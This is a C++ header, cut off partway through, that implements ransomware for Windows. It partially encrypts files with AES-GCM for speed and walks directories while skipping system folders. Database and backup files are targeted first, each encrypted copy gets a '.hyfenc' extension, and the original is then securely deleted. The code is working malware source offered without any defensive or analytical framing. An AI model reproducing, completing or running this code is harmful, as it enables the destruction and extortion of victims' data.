#pragma once
#ifndef ENCRYPTION_UTILS_H
#define ENCRYPTION_UTILS_H

#define NOMINMAX
#include"processkill.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <algorithm>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h>
#include <map>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include "Message.h"

// 使用inline避免重复定义
inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096; // 文件头部加密4KB
inline constexpr DWORD KEY_LENGTH = 16; // AES-128
inline constexpr DWORD IV_LENGTH = 12;  // GCM推荐12字节IV
inline constexpr DWORD TAG_LENGTH = 16; // GCM认证标签16字节
inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64; // 64MB内存池
inline constexpr DWORD MAX_CONCURRENT_IO = 80; // 最大并发I/O操作数
inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024; // 1MB异步缓冲区
inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15; // 分块加密比例15%
inline constexpr size_t CHUNK_SIZE = 1024 * 1024; // 分块大小1MB

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "kernel32.lib")

namespace fs = std::filesystem;
inline fs::path GetUserDocumentsPath() {
    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path);
    if (SUCCEEDED(hr)) {
        fs::path docsPath(path);
        CoTaskMemFree(path);
        return docsPath;
    }
    std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;
    return fs::current_path();
}
// 前向声明
bool SecureDelete(const fs::path& path);
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// 辅助函数
void GenerateRandomKey(BYTE* key, DWORD length);
bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
fs::path GetUserDocumentsPath();
bool IsAesNiSupported();
std::string to_hex(NTSTATUS status);

// 自定义min/max替代函数
template<typename T>
T custom_min(T a, T b) {
    return a < b ? a : b;
}

template<typename T>
T custom_max(T a, T b) {
    return a > b ? a : b;
}

// RAII封装 - 内存映射文件类（修复版）
class MemoryMappedFile {
public:
    MemoryMappedFile() : hFile(INVALID_HANDLE_VALUE), hMapping(NULL), pData(nullptr), size(0) {}

    ~MemoryMappedFile() {
        close();
    }

    bool open(const fs::path& filePath, DWORD access = GENERIC_READ | GENERIC_WRITE,
        DWORD mappingProtect = PAGE_READWRITE, DWORD viewAccess = FILE_MAP_READ | FILE_MAP_WRITE) {
        close();

        // 打开文件
        hFile = CreateFileW(filePath.c_str(), access, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        // 获取文件大小
        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize)) {
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            return false;
        }
        size = static_cast<size_t>(fileSize.QuadPart);

        // 创建内存映射
        hMapping = CreateFileMappingW(hFile, NULL, mappingProtect, 0, 0, NULL);
        if (hMapping == NULL) {
            DWORD error = GetLastError();
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "CreateFileMappingW failed. Error: " << error << std::endl;
            return false;
        }

        // 映射视图
        pData = MapViewOfFile(hMapping, viewAccess, 0, 0, size);
        if (pData == NULL) {
            DWORD error = GetLastError();
            CloseHandle(hMapping);
            CloseHandle(hFile);
            hMapping = NULL;
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "MapViewOfFile failed. Error: " << error << std::endl;
            return false;
        }

        return true;
    }

    void close() {
        if (pData) {
            UnmapViewOfFile(pData);
            pData = nullptr;
        }
        if (hMapping != NULL) {
            CloseHandle(hMapping);
            hMapping = NULL;
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
        }
        size = 0;
    }

    void* data() const { return pData; }
    size_t getSize() const { return size; }
    bool isOpen() const { return pData != nullptr; }

private:
    HANDLE hFile;
    HANDLE hMapping;
    void* pData;
    size_t size;
};

// RAII封装 - 异步I/O上下文
struct AsyncIOContext {
    OVERLAPPED overlapped;
    HANDLE hFile;
    void* buffer;
    DWORD bufferSize;
    std::function<void(DWORD)> callback;
    std::atomic<bool> completed;

    AsyncIOContext() : hFile(INVALID_HANDLE_VALUE), buffer(nullptr), bufferSize(0), completed(false) {
        ZeroMemory(&overlapped, sizeof(OVERLAPPED));
    }

    ~AsyncIOContext() {
        if (buffer) {
            VirtualFree(buffer, 0, MEM_RELEASE);
        }
    }

    bool allocateBuffer(DWORD size) {
        buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return false;
        bufferSize = size;
        return true;
    }
};

// IOCP线程池实现
class IOCPThreadPool {
public:
    IOCPThreadPool(size_t minThreads, size_t maxThreads) : stop(false) {
        hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
        if (!hCompletionPort) {
            throw std::runtime_error("Failed to create IOCP");
        }

        threadCount = CalculateOptimalThreadCount(minThreads, maxThreads);
        for (size_t i = 0; i < threadCount; ++i) {
            threads.emplace_back([this] { worker(); });
        }
    }

    ~IOCPThreadPool() {
        stop = true;
        for (size_t i = 0; i < threads.size(); ++i) {
            PostQueuedCompletionStatus(hCompletionPort, 0, 0, NULL);
        }

        for (auto& thread : threads) {
            if (thread.joinable()) thread.join();
        }

        if (hCompletionPort) CloseHandle(hCompletionPort);
    }

    bool associateDevice(HANDLE hDevice, ULONG_PTR completionKey) {
        return CreateIoCompletionPort(hDevice, hCompletionPort, completionKey, 0) != NULL;
    }

    bool postCompletion(DWORD bytesTransferred, ULONG_PTR completionKey, OVERLAPPED* overlapped) {
        return PostQueuedCompletionStatus(hCompletionPort, bytesTransferred, completionKey, overlapped);
    }

private:
    size_t CalculateOptimalThreadCount(size_t minThreads, size_t maxThreads) {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        size_t cpuCount = sysInfo.dwNumberOfProcessors;
        if (cpuCount == 0) cpuCount = 1;

        // 根据CPU和内存大小计算线程数
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(memInfo);
        GlobalMemoryStatusEx(&memInfo);

        size_t memoryBasedThreads = static_cast<size_t>(memInfo.ullTotalPhys / (1024 * 1024 * 1024)) * 2;

        size_t dynamicCount = custom_min(cpuCount * 2 + memoryBasedThreads, maxThreads);
        size_t temp = custom_min(dynamicCount, maxThreads);
        return custom_max(temp, minThreads);
    }

    void worker() {
        while (!stop) {
            DWORD bytesTransferred = 0;
            ULONG_PTR completionKey = 0;
            OVERLAPPED* overlapped = nullptr;

            BOOL success = GetQueuedCompletionStatus(
                hCompletionPort, &bytesTransferred, &completionKey, &overlapped, INFINITE);

            if (stop) break;

            if (!success || overlapped == nullptr) {
                continue;
            }

            AsyncIOContext* context = CONTAINING_RECORD(overlapped, AsyncIOContext, overlapped);
            if (context && context->callback) {
                context->callback(bytesTransferred);
                context->completed = true;
            }
        }
    }

    HANDLE hCompletionPort;
    std::vector<std::thread> threads;
    std::atomic<bool> stop;
    size_t threadCount;
};

// 内存池
class SmartMemoryPool {
public:
    SmartMemoryPool(size_t poolSize = MEMORY_POOL_SIZE) : poolSize(poolSize) {
        pool = VirtualAlloc(NULL, poolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pool) {
            throw std::runtime_error("Failed to allocate memory pool");
        }

        freeBlocks.emplace(0, poolSize);
    }

    ~SmartMemoryPool() {
        if (pool) {
            VirtualFree(pool, 0, MEM_RELEASE);
        }
    }

    void* allocate(size_t size) {
        std::lock_guard<std::mutex> lock(mutex);

        // 寻找足够大的空闲块
        for (auto it = freeBlocks.begin(); it != freeBlocks.end(); ++it) {
            if (it->second >= size) {
                void* ptr = static_cast<char*>(pool) + it->first;

                // 分割块
                if (it->second > size) {
                    freeBlocks[it->first + size] = it->second - size;
                }
                freeBlocks.erase(it);

                allocatedBlocks[ptr] = size;
                return ptr;
            }
        }

        // 没有足够空间，回退到常规分配
        return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    void deallocate(void* ptr) {
        std::lock_guard<std::mutex> lock(mutex);

        auto it = allocatedBlocks.find(ptr);
        if (it == allocatedBlocks.end()) {
            // 不是从池中分配的，使用常规释放
            VirtualFree(ptr, 0, MEM_RELEASE);
            return;
        }

        size_t offset = static_cast<char*>(ptr) - static_cast<char*>(pool);
        size_t size = it->second;

        // 合并相邻的空闲块
        freeBlocks[offset] = size;
        mergeFreeBlocks();

        allocatedBlocks.erase(it);
    }

private:
    void mergeFreeBlocks() {
        auto it = freeBlocks.begin();
        while (it != freeBlocks.end()) {
            auto next = it;
            ++next;

            if (next != freeBlocks.end() && it->first + it->second == next->first) {
                // 合并相邻块
                it->second += next->second;
                freeBlocks.erase(next);
            }
            else {
                ++it;
            }
        }
    }

    void* pool;
    size_t poolSize;
    std::mutex mutex;
    std::map<size_t, size_t> freeBlocks; // offset -> size
    std::unordered_map<void*, size_t> allocatedBlocks; // ptr -> size
};

// 全局内存池
inline SmartMemoryPool& getGlobalMemoryPool() {
    static SmartMemoryPool pool;
    return pool;
}

// 全局IOCP线程池
inline std::unique_ptr<IOCPThreadPool>& getGlobalIOCPPool() {
    static std::unique_ptr<IOCPThreadPool> pool;
    if (!pool) {
        pool = std::make_unique<IOCPThreadPool>(4, 64);
    }
    return pool;
}

// 异步加密管理器
class AsyncEncryptionManager {
public:
    AsyncEncryptionManager(size_t maxConcurrentTasks = MAX_CONCURRENT_IO)
        : maxConcurrentTasks(maxConcurrentTasks), stop(false), activeTasks(0),
        completedTasks(0), failedTasks(0) {
        // 创建工作线程
        for (size_t i = 0; i < maxConcurrentTasks; ++i) {
            workers.emplace_back([this] { worker(); });
        }
    }

    ~AsyncEncryptionManager() {
        stop = true;
        condition.notify_all();

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }

    void addTask(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
        std::unique_lock<std::mutex> lock(queueMutex);
        tasks.push({ inputFile, outputFile, key });
        lock.unlock();
        condition.notify_one();
    }

    void waitForCompletion() {
        std::unique_lock<std::mutex> lock(queueMutex);
        completionCondition.wait(lock, [this] {
            return tasks.empty() && activeTasks == 0;
            });
    }

    // 添加统计方法
    void printStatistics() {
        std::cout << "加密任务统计: " << std::endl;
        std::cout << "  成功: " << completedTasks << " 个文件" << std::endl;
        std::cout << "  失败: " << failedTasks << " 个文件" << std::endl;
        std::cout << "  总计: " << (completedTasks + failedTasks) << " 个文件" << std::endl;
    }

private:
    void worker() {
        while (!stop) {
            std::tuple<fs::path, fs::path, const BYTE*> task;

            {
                std::unique_lock<std::mutex> lock(queueMutex);
                condition.wait(lock, [this] {
                    return stop || !tasks.empty();
                    });

                if (stop && tasks.empty()) break;
                if (tasks.empty()) continue;

                task = tasks.front();
                tasks.pop();
                activeTasks++;
            }

            // 执行加密任务
            fs::path inputFile = std::get<0>(task);
            fs::path outputFile = std::get<1>(task);
            const BYTE* key = std::get<2>(task);

            bool encryptSuccess = EncryptFileCNG(inputFile, outputFile, key);

            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (encryptSuccess) {
                    completedTasks++;
                }
                else {
                    failedTasks++;
                }

                activeTasks--;
                if (tasks.empty() && activeTasks == 0) {
                    completionCondition.notify_all();
                }
            }
        }
    }

    std::queue<std::tuple<fs::path, fs::path, const BYTE*>> tasks;
    std::vector<std::thread> workers;
    std::mutex queueMutex;
    std::condition_variable condition;
    std::condition_variable completionCondition;
    std::atomic<bool> stop;
    std::atomic<size_t> activeTasks;
    std::atomic<size_t> completedTasks;
    std::atomic<size_t> failedTasks;
    size_t maxConcurrentTasks;
};

// 计算分块加密大小
inline size_t CalculateChunkEncryptSize(size_t chunkSize) {
    size_t encryptSize = static_cast<size_t>(chunkSize * CHUNK_ENCRYPT_RATIO / 100.0);
    // 对齐到16字节边界（AES块大小）
    encryptSize = encryptSize - (encryptSize % 16);
    return custom_max(encryptSize, static_cast<size_t>(16));
}

// GCM模式加密函数
// 修改EncryptFileChunksGCM函数中的authInfo设置部分
inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
    const BYTE* inputData, size_t fileSize,
    HANDLE hOutputFile, bool isDatabaseFile) {
    try {
        DWORD bytesWritten = 0;
        LARGE_INTEGER writeOffset;

        if (!isDatabaseFile) {
            // 写入IV到文件开头
            writeOffset.QuadPart = 0;
            if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                throw std::runtime_error("SetFilePointerEx failed for IV write");
            }

            if (!WriteFile(hOutputFile, iv, IV_LENGTH, &bytesWritten, NULL) || bytesWritten != IV_LENGTH) {
                throw std::runtime_error("Failed to write IV");
            }
        }

        // 设置GCM模式信息
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);

        // 修复：使用const_cast移除const限定符
        authInfo.pbNonce = const_cast<BYTE*>(iv);
        authInfo.cbNonce = IV_LENGTH;

        // 为认证标签预留空间
        std::vector<BYTE> tagBuffer(TAG_LENGTH);
        authInfo.pbTag = tagBuffer.data();
        authInfo.cbTag = TAG_LENGTH;

        // 分块加密逻辑
        size_t totalChunks = (fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
        std::vector<BYTE> chunkBuffer(CHUNK_SIZE);
        std::vector<BYTE> encryptedChunkBuffer(CHUNK_SIZE + TAG_LENGTH); // 额外空间用于标签

        for (size_t chunkIndex = 0; chunkIndex < totalChunks; ++chunkIndex) {
            size_t chunkOffset = chunkIndex * CHUNK_SIZE;
            size_t currentChunkSize = custom_min(CHUNK_SIZE, fileSize - chunkOffset);

            // 复制块数据到缓冲区
            memcpy(chunkBuffer.data(), inputData + chunkOffset, currentChunkSize);

            // 计算当前块的加密大小
            size_t encryptSizeThisChunk = 0;
            if (fileSize < 1024 * 1024) { // 小于1MB
                if (chunkIndex == 0) { // 只加密第一个块的头部
                    encryptSizeThisChunk = custom_min(static_cast<size_t>(HEADER_ENCRYPT_SIZE), currentChunkSize);
                }
            }
            else { // 大于等于1MB
                encryptSizeThisChunk = CalculateChunkEncryptSize(currentChunkSize);
                encryptSizeThisChunk = custom_min(encryptSizeThisChunk, currentChunkSize);
            }

            if (encryptSizeThisChunk > 0) {
                // 加密当前块的数据
                ULONG cbResult = 0;
                NTSTATUS status = BCryptEncrypt(
                    hKey,
                    chunkBuffer.data(),
                    static_cast<ULONG>(encryptSizeThisChunk),
                    &authInfo,
                    nullptr, // 无额外认证数据
                    0,
                    encryptedChunkBuffer.data(),
                    static_cast<ULONG>(encryptedChunkBuffer.size()),
                    &cbResult,
                    0
                );

                if (!NT_SUCCESS(status)) {
                    throw std::runtime_error("BCryptEncrypt failed in chunk " +
                        std::to_string(chunkIndex) + ": " + to_hex(status));
                }

                // 写入加密数据
                writeOffset.QuadPart = isDatabaseFile ? chunkOffset : (IV_LENGTH + chunkOffset);
                if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                    throw std::runtime_error("SetFilePointerEx failed for chunk write");
                }

                if (!WriteFile(hOutputFile, encryptedChunkBuffer.data(), cbResult, &bytesWritten, NULL) ||
                    bytesWritten != cbResult) {
                    throw std::runtime_error("WriteFile failed for chunk " + std::to_string(chunkIndex));
                }
            }

            // 写入当前块的剩余未加密数据（如果有）
            if (currentChunkSize > encryptSizeThisChunk) {
                size_t remainingSize = currentChunkSize - encryptSizeThisChunk;
                writeOffset.QuadPart = isDatabaseFile ?
                    (chunkOffset + encryptSizeThisChunk) :
                    (IV_LENGTH + chunkOffset + encryptSizeThisChunk);

                if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                    throw std::runtime_error("SetFilePointerEx failed for remaining data write");
                }

                if (!WriteFile(hOutputFile, chunkBuffer.data() + encryptSizeThisChunk,
                    static_cast<DWORD>(remainingSize), &bytesWritten, NULL) ||
                    bytesWritten != remainingSize) {
                    throw std::runtime_error("WriteFile failed for remaining data in chunk " +
                        std::to_string(chunkIndex));
                }
            }
        }

        // 写入认证标签
        if (!isDatabaseFile) {
            writeOffset.QuadPart = IV_LENGTH + fileSize;
            if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                throw std::runtime_error("SetFilePointerEx failed for tag write");
            }

            if (!WriteFile(hOutputFile, tagBuffer.data(), TAG_LENGTH, &bytesWritten, NULL) ||
                bytesWritten != TAG_LENGTH) {
                throw std::runtime_error("Failed to write authentication tag");
            }
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "分块加密错误: " << e.what() << std::endl;
        return false;
    }
}

// 修改EncryptFileCNG函数中的EncryptFileChunksGCM调用部分
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    std::vector<BYTE> keyObject;
    std::vector<BYTE> iv(IV_LENGTH);
    DWORD cbKeyObject = 0;
    NTSTATUS status;
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;
    bool encryptionSuccess = false;
    MemoryMappedFile inputMap;

    try {
        // Check AES-NI hardware acceleration support
        bool hwAccelSupported = IsAesNiSupported();
        const wchar_t* algorithmProvider = hwAccelSupported ?
            BCRYPT_AES_ALGORITHM : MS_PRIMITIVE_PROVIDER;

        status = BCryptOpenAlgorithmProvider(&hAlgorithm, algorithmProvider, NULL, 0);
        if (!NT_SUCCESS(status)) {
            status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
            if (!NT_SUCCESS(status)) {
                throw std::runtime_error("BCryptOpenAlgorithmProvider failed: " + to_hex(status));
            }
        }

        // Set encryption mode to GCM
        const wchar_t* chainMode = BCRYPT_CHAIN_MODE_GCM;
        status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(chainMode)),
            static_cast<ULONG>(wcslen(chainMode) * sizeof(wchar_t)), 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptSetProperty failed: " + to_hex(status));
        }

        // Get key object size
        DWORD cbData = 0;
        status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbData, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGetProperty(OBJECT_LENGTH) failed: " + to_hex(status));
        }

        keyObject.resize(cbKeyObject);

        // Generate symmetric key
        status = BCryptGenerateSymmetricKey(
            hAlgorithm, &hKey, keyObject.data(), cbKeyObject,
            const_cast<BYTE*>(key), KEY_LENGTH, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenerateSymmetricKey failed: " + to_hex(status));
        }

        // Generate IV
        status = BCryptGenRandom(NULL, iv.data(), IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
        }

        // Open input file using memory mapping
        if (!inputMap.open(inputFile, GENERIC_READ, PAGE_READONLY, FILE_MAP_READ)) {
            DWORD error = GetLastError();
            throw std::runtime_error("Failed to memory map input file. Error: " + std::to_string(error));
        }

        size_t fileSize = inputMap.getSize();
        if (fileSize == 0) {
            throw std::runtime_error("Input file is empty");
        }

        std::string extension = inputFile.extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

        // Database file extension collection
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        bool isDatabaseFile = databaseExtensions.find(extension) != databaseExtensions.end();

        // 修改部分：增强权限处理的文件创建逻辑
        // Create output file - 增强权限处理
        DWORD desiredAccess = GENERIC_READ | GENERIC_WRITE;
        DWORD shareMode = FILE_SHARE_READ; // 允许其他进程读取
        DWORD creationDisposition = CREATE_ALWAYS;
        DWORD flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN;

        hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
            creationDisposition, flagsAndAttributes, NULL);

        if (hOutputFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            // 如果是权限错误，尝试使用更低权限模式
            if (error == ERROR_ACCESS_DENIED) {
                std::cerr << "警告: 无法以完全访问权限创建文件，尝试只写模式: " << outputFile << std::endl;

                // 尝试只写模式
                desiredAccess = GENERIC_WRITE;
                shareMode = 0; // 不共享
                hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
                    creationDisposition, flagsAndAttributes, NULL);

                if (hOutputFile == INVALID_HANDLE_VALUE) {
                    error = GetLastError();
                    // 如果仍然失败，跳过此文件
                    std::cerr << "无法创建输出文件，跳过: " << outputFile << " 错误: " << error << std::endl;
                    throw std::runtime_error("CreateFile failed for output. Error: " + std::to_string(error));
                }
            }
            else {
                throw std::runtime_error("CreateFile failed for output. Error: " + std::to_string(error));
            }
        }

        // Calculate output file size
        size_t outputSize = fileSize;
        if (!isDatabaseFile) {
            outputSize += IV_LENGTH + TAG_LENGTH; // For non-database files, add IV at beginning and Tag at end
        }

        // Set file size
        LARGE_INTEGER liSize;
        liSize.QuadPart = outputSize;
        if (!SetFilePointerEx(hOutputFile, liSize, NULL, FILE_BEGIN)) {
            DWORD error = GetLastError();
            throw std::runtime_error("SetFilePointerEx failed. Error: " + std::to_string(error));
        }

        if (!SetEndOfFile(hOutputFile)) {
            DWORD error = GetLastError();
            throw std::runtime_error("SetEndOfFile failed. Error: " + std::to_string(error));
        }

        // Use GCM mode encryption function
        if (!EncryptFileChunksGCM(hKey, iv.data(), static_cast<const BYTE*>(inputMap.data()),
            fileSize, hOutputFile, isDatabaseFile)) {
            throw std::runtime_error("GCM chunk encryption failed");
        }

        // Close memory mapping and file handles
        inputMap.close();

        // Ensure file handle is properly closed
        if (hOutputFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hOutputFile);
            hOutputFile = INVALID_HANDLE_VALUE;
        }

        // Release CNG resources
        if (hKey) {
            BCryptDestroyKey(hKey);
            hKey = NULL;
        }
        if (hAlgorithm) {
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            hAlgorithm = NULL;
        }

        // Securely delete source file after successful encryption
        std::cout << "Encryption completed, securely deleting source file: " << inputFile << std::endl;

        // 修改部分：增强安全删除的错误处理
        if (!SecureDelete(inputFile)) {
            std::cerr << "警告: 安全删除失败，尝试普通删除: " << inputFile << std::endl;
            // 回退到普通删除
            std::error_code ec;
            if (!fs::remove(inputFile, ec)) {
                std::cerr << "普通删除也失败: " << inputFile << " 错误: " << ec.message() << std::endl;
            }
            else {
                std::cout << "普通删除成功: " << inputFile << std::endl;
            }
        }

        std::cout << "File encrypted and source file deleted successfully: " << inputFile << " -> " << outputFile << std::endl;
        encryptionSuccess = true;
        return true;
    }
    catch (const std::exception& e) {
        // Clean up resources - ensure all resources are properly released
        if (hKey) {
            BCryptDestroyKey(hKey);
            hKey = NULL;
        }
        if (hAlgorithm) {
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            hAlgorithm = NULL;
        }

        // Ensure file handle is properly closed
        if (hOutputFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hOutputFile);
            hOutputFile = INVALID_HANDLE_VALUE;
        }

        // Close memory mapping
        inputMap.close();

        // Delete incomplete output file only if encryption was not successful
        if (!encryptionSuccess) {
            DWORD attributes = GetFileAttributesW(outputFile.c_str());
            if (attributes != INVALID_FILE_ATTRIBUTES) {
                // Ensure file is not read-only
                if (attributes & FILE_ATTRIBUTE_READONLY) {
                    SetFileAttributesW(outputFile.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
                }

                // Use Windows API to delete file
                if (DeleteFileW(outputFile.c_str())) {
                    std::cout << "Deleted incomplete output file: " << outputFile << std::endl;
                }
                else {
                    DWORD error = GetLastError();
                    std::cerr << "Failed to delete incomplete output file: " << outputFile << " Error: " << error << std::endl;
                }
            }
        }

        std::cerr << "Encryption error: " << e.what() << " File: " << inputFile << std::endl;
        return false;
    }
}

// 遍历目录并异步加密文件（修改版）
// 在traverseAndEncryptAsync函数中添加系统文件检查
inline void traverseAndEncryptAsync(const fs::path& directoryPath,
    const std::vector<std::string>& extensions,
    const BYTE* key) {
    try {
        // 检查目录是否有效
        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
            std::cerr << "无效目录: " << directoryPath << std::endl;
            return;
        }

        // 创建异步加密管理器
        AsyncEncryptionManager manager;

        // 初始化计数器
        size_t fileCount = 0;
        size_t dbFileCount = 0;
        size_t otherFileCount = 0;
        size_t skippedFiles = 0;
        size_t smallFileCount = 0;
        size_t largeFileCount = 0;

        // 系统文件模式，这些文件通常无法访问或不应修改
        static const std::vector<std::wstring> systemPatterns = {
            L"WindowsApps",
            L"Windows",
            L"System32",
            L"$Recycle.Bin",
            L"ProgramData\\Microsoft\\Windows",
            L"AppData",
            L"Temp",
            L"Temporary Internet Files",
            L"WinSxS",
            L"DriverStore",
            L"Assembly",
            L"Microsoft.NET",
            L"ServiceProfiles",
            L"System Volume Information"
        };

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        // 第一阶段：优先处理数据库文件
        std::cout << "第一阶段：开始处理数据库文件..." << std::endl;
        try {
            for (const auto& entry : fs::recursive_directory_iterator(
                directoryPath, fs::directory_options::skip_permission_denied)) {

                // 跳过非普通文件
                if (!entry.is_regular_file()) continue;

                // 检查是否是系统文件
                std::wstring filePath = entry.path().wstring();
                bool isSystemFile = false;
                for (const auto& pattern : systemPatterns) {
                    if (filePath.find(pattern) != std::wstring::npos) {
                        isSystemFile = true;
                        skippedFiles++;
                        break;
                    }
                }

                if (isSystemFile) continue;

                // 获取文件扩展名并转换为小写
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                // 检查是否是数据库文件
                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
                if (!isDatabaseFile) continue; // 跳过非数据库文件（它们在第二阶段处理）

                // 检查扩展名是否在目标列表中
                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                    [&](const std::string& targetExt) {
                        std::string lowerTarget = targetExt;
                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                        return ext == lowerTarget;
                    });

                if (shouldEncrypt) {
                    // 创建加密后的文件名
                    fs::path outputFile = entry.path();
                    outputFile += ".hyfenc";

                    // 添加加密任务
                    manager.addTask(entry.path(), outputFile, key);
                    fileCount++;
                    dbFileCount++;

                    // 统计文件大小分类
                    size_t fileSize = entry.file_size();
                    if (fileSize < 1024 * 1024) {
                        smallFileCount++;
                    }
                    else {
                        largeFileCount++;
                    }

                    std::cout << "已添加数据库文件加密任务: " << entry.path() << " (大小: "
                        << fileSize / 1024 << " KB)" << std::endl;
                }
            }
        }
        catch (const std::exception& e) {
            std::cerr << "第一阶段处理出错: " << e.what() << std::endl;
        }

        std::cout << "第一阶段完成，找到 " << dbFileCount << " 个数据库文件" << std::endl;
        std::cout << "  小于1MB: " << smallFileCount << " 个" << std::endl;
        std::cout << "  大于等于1MB: " << largeFileCount << " 个" << std::endl;
        std::cout << "  跳过系统文件: " << skippedFiles << " 个" << std::endl;

        // 重置计数器用于第二阶段
        smallFileCount = 0;
        largeFileCount = 0;
        skippedFiles = 0;

        // 第二阶段：处理其他文件
        std::cout << "\n第二阶段：开始处理其他文件..." << std::endl;
        try {
            for (const auto& entry : fs::recursive_directory_iterator(
                directoryPath, fs::directory_options::skip_permission_denied)) {

                // 跳过非普通文件
                if (!entry.is_regular_file()) continue;

                // 检查是否是系统文件
                std::wstring filePath = entry.path().wstring();
                bool isSystemFile = false;
                for (const auto& pattern : systemPatterns) {
                    if (filePath.find(pattern) != std::wstring::npos) {
                        isSystemFile = true;
                        skippedFiles++;
                        break;
                    }
                }

                if (isSystemFile) continue;

                // 获取文件扩展名并转换为小写
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                // 跳过数据库文件（它们已在第一阶段处理）
                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
                if (isDatabaseFile) continue;

                // 检查扩展名是否在目标列表中
                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                    [&](const std::string& targetExt) {
                        std::string lowerTarget = targetExt;
